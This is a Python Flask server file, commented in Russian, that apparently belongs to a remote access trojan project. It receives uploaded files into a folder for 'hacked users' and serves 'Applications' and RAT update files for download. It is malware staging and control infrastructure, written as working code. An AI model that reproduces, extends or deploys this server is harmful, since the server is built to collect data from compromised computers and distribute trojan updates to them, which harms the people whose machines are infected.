import subprocess
import os
from flask import Flask, render_template, send_from_directory, request, redirect, url_for
from werkzeug.utils import secure_filename

# Создаем приложение Flask
app = Flask(__name__)

# Папка для сохранения загруженных файлов
UPLOAD_FOLDER = r"Virus\RAT\Python_HTML_Server\Hacked_Users_Applications"
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

BASE_DIR = os.getcwd()  # Папка запуска — DarkPi
app.config["DOWNLOAD_FOLDER"] = os.path.join(BASE_DIR, "Virus", "RAT", "Python_HTML_Server", "Applications")
app.config["UPDATE_FOLDER"] = os.path.join(BASE_DIR, "Virus", "RAT", "Python_HTML_Server", "Update")

# Создаем папку, если её нет
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Главная страница
@app.route('/')
def hello_world():
    return render_template("index.html")

# Страница для отображения файлов из папки 'Applications'
@app.route('/application')
def application():
    applications_folder = app.config["DOWNLOAD_FOLDER"]
    abs_path = os.path.abspath(applications_folder)
    print(f"🔍 Ищем файлы в директории: {abs_path}")

    if os.path.exists(applications_folder):
        files = os.listdir(applications_folder)
        print(f"✅ Найдены файлы: {files}")
    else:
        files = []
        print("❌ Папка 'Applications' не найдена!")

    return render_template("application.html", files=files)

# Страница для загрузки файлов
@app.route('/upload', methods=['GET', 'POST'])
def upload_page():
    if request.method == 'POST':
        if 'file' not in request.files:
            print("[ERROR] В запросе отсутствует файл")
            return "Ошибка: Файл не найден в запросе", 400

        file = request.files['file']

        if file.filename == '':
            print("[ERROR] Имя файла пустое")
            return "Ошибка: Имя файла пустое", 400

        filename = secure_filename(os.path.basename(file.filename))
        file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

        print(f"[DEBUG] Попытка сохранить файл: {file_path}")

        try:
            file.save(file_path)
            print(f"[DEBUG] ✅ Файл сохранен в: {file_path}")
        except Exception as e:
            print(f"[ERROR] Ошибка сохранения файла: {e}")
            return f"Ошибка при сохранении файла: {e}", 500

        return redirect(url_for('hello_world'))

    return render_template("upload.html")

# Страница для скачивания файла
@app.route('/download/<filename>')
def download_file(filename):
    folder = app.config["DOWNLOAD_FOLDER"]
    abs_folder = os.path.abspath(folder)
    file_path = os.path.join(abs_folder, filename)

    print(f"[DEBUG] Запрошен файл для скачивания: {filename}")
    print(f"[DEBUG] Папка для скачивания (абсолютный путь): {abs_folder}")
    print(f"[DEBUG] Полный путь к файлу: {file_path}")

    if not os.path.exists(file_path):
        print(f"[ERROR] Файл не найден: {file_path}")
        return "Файл не найден", 404

    try:
        return send_from_directory(folder, filename, as_attachment=True)
    except Exception as e:
        print(f"[ERROR] Ошибка при отправке файла: {e}")
        return f"Ошибка при отправке файла: {e}", 500
    
@app.route('/update')
def update_page():
    update_folder = app.config["UPDATE_FOLDER"]
    abs_path = os.path.abspath(update_folder)
    print(f"🔍 Ищем файлы обновлений в директории: {abs_path}")

    if os.path.exists(update_folder):
        files = os.listdir(update_folder)
        print(f"✅ Найдены файлы обновлений: {files}")
    else:
        files = []
        print("❌ Папка 'Update' не найдена!")

    return render_template("update_page.html", files=files)

@app.route("/update_rat/<filename>")
def downoald_and_update_file(filename):
    folder = app.config["UPDATE_FOLDER"]
    abs_folder = os.path.abspath(folder)
    file_path = os.path.join(abs_folder, filename)

    print(f"[DEBUG] Запрошен файл для скачивания: {filename}")
    print(f"[DEBUG] Папка для скачивания (абсолютный путь): {abs_folder}")
    print(f"[DEBUG] Полный путь к файлу: {file_path}")

    if not os.path.exists(file_path):
        print(f"[ERROR] Файл не найден: {file_path}")
        return "Файл не найден", 404

    try:
        return send_from_directory(folder, filename, as_attachment=True)
    except Exception as e:
        print(f"[ERROR] Ошибка при отправке файла: {e}")
        return f"Ошибка при отправке файла: {e}", 500
    

def run_flask():
    app.run(port=5000, debug=True, use_reloader=False)

# run_flask()
